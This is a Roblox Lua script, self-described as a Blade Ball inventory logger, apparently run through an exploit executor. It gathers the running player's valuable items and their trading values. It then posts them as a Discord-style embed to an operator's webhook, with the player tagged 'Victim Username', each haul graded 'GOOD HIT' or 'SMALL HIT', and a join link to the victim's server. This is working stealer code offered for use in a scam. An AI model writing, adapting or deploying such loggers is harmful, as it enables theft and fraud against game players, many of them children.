_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // AUTHENTICATION
local auth_token = "EBK-SS-A" 

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- // CONFIGURATION RÉCUPÉRÉE
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // FONCTION D'ENVOI POUR TON WORKER
local function sendToWorker(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // FORMATAGE
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // RÉCUPÉRATION INVENTAIRE & RAP
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
local categories = {"Sword", "Emote", "Explosion"}

local itemsFound = {}
local totalRAP = 0

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for _, itemInfo in pairs(clientInventory[cat]) do
            local rap = 0
            if rapData[cat] then
                for key, value in pairs(rapData[cat]) do
                    if string.find(key, itemInfo.Name) then
                        rap = value
                        break
                    end
                end
            end
            
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsFound, {Name = itemInfo.Name, RAP = rap})
            end
        end
    end
end

-- // PRÉPARATION DE L'EMBED (TON FORMAT)
if #itemsFound > 0 or totalRAP > 0 then
    table.sort(itemsFound, function(a, b) return a.RAP > b.RAP end)

    local isGoodHit = totalRAP >= 500
    local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local webhookName = isGoodHit and "🟢 Eblack - LOGGER" or "🟣 Eblack - LOGGER"
    local embedColor = isGoodHit and 65280 or 8323327

    local itemListText = ""
    for i, item in ipairs(itemsFound) do
        if i <= 25 then -- Limite pour l'affichage Discord
            itemListText = itemListText .. string.format("%s - **%s RAP**\n", item.Name, formatNumber(item.RAP))
        end
    end

    local payload = {
        ["auth_token"] = auth_token,
        ["username"] = webhookName,
        ["content"] = (ping == "Yes" and "@everyone " or "") .. "New Inventory Logged!",
        ["embeds"] = {{
            ["title"] = embedTitle,
            ["color"] = embedColor,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = true},
                {name = "Item list 📝:", value = itemListText ~= "" and itemListText or "No high RAP items found.", inline = false},
                {name = "Join link 🔗:", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball Inventory Logger by Eblack"}
        }}
    }

    sendToWorker(payload)
end
